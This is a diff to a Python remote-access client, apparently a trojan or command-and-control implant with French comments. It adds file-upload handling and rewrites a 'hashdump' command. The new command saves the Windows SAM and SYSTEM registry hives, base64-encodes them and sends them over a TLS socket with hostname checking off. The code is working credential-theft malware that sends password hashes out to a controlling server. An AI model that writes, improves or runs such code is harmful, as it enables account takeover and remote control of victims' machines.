@@ -29,14 +29,10 @@ except ImportError:
 def check_privileges():
     # Vérification des privilèges administratifs
     if os.name == 'nt':
-        try:
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except AttributeError:
-            is_admin = os.getuid() == 0
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
     else:
-        is_admin = os.geteuid() == 0
-    return is_admin
+        return os.geteuid() == 0
 
 class CLIENT:
     SOCK = None
@@ -76,7 +72,9 @@ class CLIENT:
                 self.send_data("Error: No file specified for download.")
         elif data[0] == "upload":
             if len(data) > 1:
-                FileUpload.upload(self.SOCK, data[1])
+                destination = data[1]
+                self.send_data(b'ready', encode=False)
+                FileUpload.upload(self.SOCK, destination)
             else:
                 self.send_data("Error: No file specified for upload.")
         elif data[0] == "hashdump":
@@ -98,8 +96,16 @@ class CLIENT:
         # Récupération des hachages de mots de passe
         if os.name == 'nt':
             try:
-                result = subprocess.check_output("reg save HKLM\\SAM sam && reg save HKLM\\SYSTEM system", shell=True)
-                self.send_data("SAM and SYSTEM hive saved.")
+                sam_file = os.path.join(os.environ['TEMP'], 'sam')
+                system_file = os.path.join(os.environ['TEMP'], 'system')
+                subprocess.check_output(f"reg save HKLM\\SAM {sam_file}", shell=True)
+                subprocess.check_output(f"reg save HKLM\\SYSTEM {system_file}", shell=True)
+                with open(sam_file, 'rb') as f:
+                    self.send_data(base64.b64encode(f.read()), encode=False)
+                with open(system_file, 'rb') as f:
+                    self.send_data(base64.b64encode(f.read()), encode=False)
+                os.remove(sam_file)
+                os.remove(system_file)
             except subprocess.CalledProcessError as e:
                 self.send_data(f"Error: {str(e)}")
         else:
@@ -122,7 +128,7 @@ class CLIENT:
                 break
 
     def engage(self):
-        # Création d'un contexte SSL avec le protocole TLS v1.3
+        # Création d'un contexte SSL avec le protocole TLS
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         context.check_hostname = False
         
